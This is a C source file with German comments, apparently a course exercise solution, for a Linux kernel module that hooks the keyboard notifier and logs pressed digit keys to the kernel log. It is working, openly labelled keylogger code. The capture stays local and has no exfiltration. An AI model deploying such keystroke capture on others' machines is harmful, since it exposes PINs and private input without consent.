// Ü 9.5 - Kernel-Modul: Zahlen-Keylogger
//
//
// === Aufgabe ===
//
// Ein einfacher Keylogger als Kernel-Modul. Alle gedrückten
// Zifferntasten (0-9) werden ins Kernel-Log ausgegeben. Andere
// Tasten werden ignoriert.
//
// Basiert auf der Lösung von 9.1, nutzt zusätzlich den Keyboard-
// Notifier des Kernels (linux/keyboard.h).
//
//
// === Wie funktioniert das? ===
//
// Der Kernel bietet eine Notifier-Chain für Tastatur-Events:
// register_keyboard_notifier(). Sobald eine Taste gedrückt oder
// losgelassen wird, ruft der Kernel den registrierten Handler auf
// und übergibt ein keyboard_notifier_param-Struct mit:
//
//   - param->value   das Keysym (entschlüsselt, z.B. ASCII bei
//                    KBD_KEYSYM-Events)
//   - param->down    1 = gedrückt, 0 = losgelassen
//   - param->shift   Shift-Status
//
// Wir reagieren auf KBD_KEYSYM-Events mit down=1 und filtern auf
// ASCII '0' bis '9'.
//
//
// === Bauen, laden, beobachten, entladen ===
//
//   make                            # baut keylogger.ko
//   sudo insmod keylogger.ko        # Modul laden
//   # jetzt ein paar Zahlen tippen
//   dmesg | tail                    # gedrückte Zifferntasten anzeigen
//   sudo rmmod keylogger            # Modul entladen
//   make clean
//
//
// === Hinweis ===
//
// Das funktioniert nur an einer Linux-Konsole (TTY) oder X11/Wayland-
// Sessions, die den klassischen Keyboard-Notifier durchreichen.
// In manchen VM-Setups oder über SSH werden die Tastendrücke nicht
// an den Kernel-Notifier gemeldet.

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Fabio Schmickl");
MODULE_DESCRIPTION("Zahlen-Keylogger als Kernel-Modul");
MODULE_VERSION("1.0");

static int keylogger_notify(struct notifier_block *nb,
                            unsigned long action,
                            void *data)
{
    struct keyboard_notifier_param *param = data;

    // Nur Tastendruck (down=1), nicht Release. KBD_KEYSYM liefert
    // bereits den entschlüsselten Wert (z.B. ASCII).
    if (action == KBD_KEYSYM && param->down)
    {
        unsigned int sym = param->value;
        if (sym >= '0' && sym <= '9')
        {
            printk(KERN_INFO "Zahlentaste: %c\n", sym);
        }
    }

    return NOTIFY_OK;
}

static struct notifier_block kbd_notifier_block = {
    .notifier_call = keylogger_notify,
};

static int __init keylogger_init(void)
{
    register_keyboard_notifier(&kbd_notifier_block);
    printk(KERN_INFO "Zahlen-Keylogger geladen\n");
    return 0;
}

static void __exit keylogger_exit(void)
{
    unregister_keyboard_notifier(&kbd_notifier_block);
    printk(KERN_INFO "Zahlen-Keylogger entladen\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);
